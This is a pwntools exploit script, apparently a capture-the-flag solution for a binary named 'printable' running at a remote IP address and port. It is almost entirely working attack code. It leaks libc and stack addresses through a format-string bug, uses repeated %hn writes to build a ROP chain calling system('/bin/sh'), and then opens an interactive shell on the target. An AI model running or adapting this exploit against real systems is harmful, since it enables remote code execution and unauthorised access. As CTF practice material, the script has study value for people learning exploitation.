from pwn import *

def writeAddr(addr, val, third):
    global r
    print(hex(addr), hex(val))
    r.sendline('%{}c'.format(addr & 0xffff) + '%12$hn' + 'aaaa')
    r.recvuntil('aaaa')
    r.sendline('%{}c'.format(val & 0xffff) + '%38$hn' + 'aaaa')
    r.recvuntil('aaaa')
    r.sendline('%{}c'.format((addr & 0xffff) + 2) + '%12$hn' + 'aaaa')
    r.recvuntil('aaaa')
    r.sendline('%{}c'.format((val & 0xffff0000) >> 16) + '%38$hn' + 'aaaa')
    r.recvuntil('aaaa')
    if third:
        r.sendline('%{}c'.format((addr & 0xffff) + 4) + '%12$hn' + 'aaaa')
        r.recvuntil('aaaa')
        r.sendline('%{}c'.format((val & 0xffff00000000) >> 32) + '%38$hn' + 'aaaa')
        r.recvuntil('aaaa')


got_strncmp = 0x403fd0
buf = 0x404060
pop_rdi = 0x40129b
ret = 0x401016

r = remote('140.110.112.77', 4005)
#r = process('printable')
raw_input('debug: ')
r.sendline('%10$p,%7$p')

addr = r.recv(29).split(',')
libc_base = int(addr[0].strip()[2:], 16) - 0x00007f8ee0c22b97 + 0x00007f8ee0c01000
stack = int(addr[1].strip()[2:], 16) - 0x10
libc_system = libc_base + 0x4f440
sh = libc_base + 0x1b3e9a 
print('libc_base: {}, libc_system: {}, stack: {}, /bin/sh: {}'.format(hex(libc_base), hex(libc_system), hex(stack), hex(sh)))

writeAddr(stack + 8, ret, False)
writeAddr(stack + 16, pop_rdi, False)
writeAddr(stack + 24, sh, True)
writeAddr(stack + 32, libc_system, True) 

r.sendline('exitt;/bin/ls\x00')
r.interactive()
